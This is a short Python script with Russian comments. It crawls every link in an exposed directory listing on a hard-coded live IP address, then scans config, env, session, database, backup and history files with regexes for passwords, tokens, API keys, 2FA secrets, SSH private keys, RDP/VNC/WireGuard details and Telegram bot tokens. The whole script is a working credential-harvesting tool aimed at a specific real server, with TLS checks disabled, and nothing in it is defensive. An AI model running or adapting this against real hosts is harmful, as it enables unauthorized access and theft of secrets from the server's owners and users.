import requests, urllib3, re, threading, queue, time
urllib3.disable_warnings()

base = "http://205.172.56.249:8001"

# Сначала собираем ВСЕ ссылки рекурсивно
all_urls = set()
visited = set()
lock = threading.Lock()

patterns = [
    r'password|passwd|pass|pwd|secret|token|api[_-]?key|apikey|auth|credential',
    r'2fa|twofa|two_factor|totp|otp',
    r'passwd\s+\w+|pass\s+\w+|pwd\s+\w+',
    r'ArekuRDP|root|admin|user',
    r'ssh|vnc|rdp|wireguard|wg0',
    r'private[_-]?key|id_rsa|id_ed25519',
    r'MTProxy|mtproto|proxy',
    r'TelegramClient|TeleBot|Bot\(|token',
]

def get_links(url):
    try:
        r = requests.get(url, timeout=8, verify=False)
        if r.status_code != 200:
            return []
        links = re.findall(r'href="([^"]*)"', r.text)
        return [l for l in links if not l.startswith('..') and l != './']
    except:
        return []

def scan_url(url):
    try:
        r = requests.get(url, timeout=8, verify=False)
        if r.status_code != 200:
            return
        content = r.text
        for pat in patterns:
            matches = re.findall(pat, content, re.IGNORECASE)
            if matches:
                with lock:
                    print(f"[MATCH] {url} -> {pat}: {matches[:10]}")
    except:
        pass

# BFS собираем все URL
to_visit = [base + "/"]
while to_visit:
    url = to_visit.pop(0)
    if url in visited:
        continue
    visited.add(url)
    links = get_links(url)
    for link in links:
        full = url.rstrip('/') + '/' + link
        if full not in visited and full.startswith(base):
            to_visit.append(full)
    if len(visited) % 50 == 0:
        print(f"Discovered: {len(visited)} URLs")

print(f"Total URLs: {len(visited)}")
print("=" * 60)

# Теперь сканируем все файлы
threads = []
for url in visited:
    if any(url.endswith(ext) for ext in ['.py', '.sh', '.conf', '.txt', '.json', '.cfg', '.ini', '.env', '.session', '.db', '.sqlite', '.bak', '.old', '.history', '.log', '.sh', '.py', '.js', '.php', '.yml', '.yaml']):
        t = threading.Thread(target=scan_url, args=(url,))
        t.start()
        threads.append(t)
        if len(threads) > 30:
            for t in threads: t.join(timeout=10)
            threads = []
        time.sleep(0.02)

for t in threads: t.join(timeout=30)
print("DONE")
